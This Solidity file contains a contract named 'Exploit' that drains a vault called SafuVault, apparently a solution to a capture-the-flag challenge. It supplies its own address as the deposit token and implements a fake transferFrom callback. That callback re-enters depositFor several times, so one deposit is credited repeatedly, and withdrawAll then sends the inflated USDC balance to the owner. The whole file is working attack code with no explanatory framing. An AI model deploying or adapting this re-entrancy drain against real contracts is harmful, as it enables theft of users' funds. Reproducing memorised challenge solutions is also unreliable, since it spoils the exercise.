// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafuVault {
    function depositFor(
        address token, 
        uint256 _amount, 
        address user
    ) external;

    function withdrawAll() external;
}

contract Exploit {
    ISafuVault public vault;
    IERC20 public usdc;
    address public owner;
    uint256 callCount;
    
    constructor(address _vault, address _usdc) {
        vault = ISafuVault(_vault);
        usdc = IERC20(_usdc);
        owner = msg.sender;
    }

    function start() public {
        vault.depositFor(
            address(this), 
            usdc.balanceOf(address(this)), 
            address(this)
        );
        vault.withdrawAll();
        usdc.transfer(owner, usdc.balanceOf(address(this)));
    }

    function transferFrom(
        address from,
        address ,
        uint256 
    ) public {
        require(msg.sender == address(vault), "not from vault");
        if (++callCount < 10) {
            vault.depositFor(
                address(this), 
                usdc.balanceOf(address(this)), 
                address(this)
            );
        } else {
            usdc.transfer(address(vault), usdc.balanceOf(address(this)));
        }
    }
}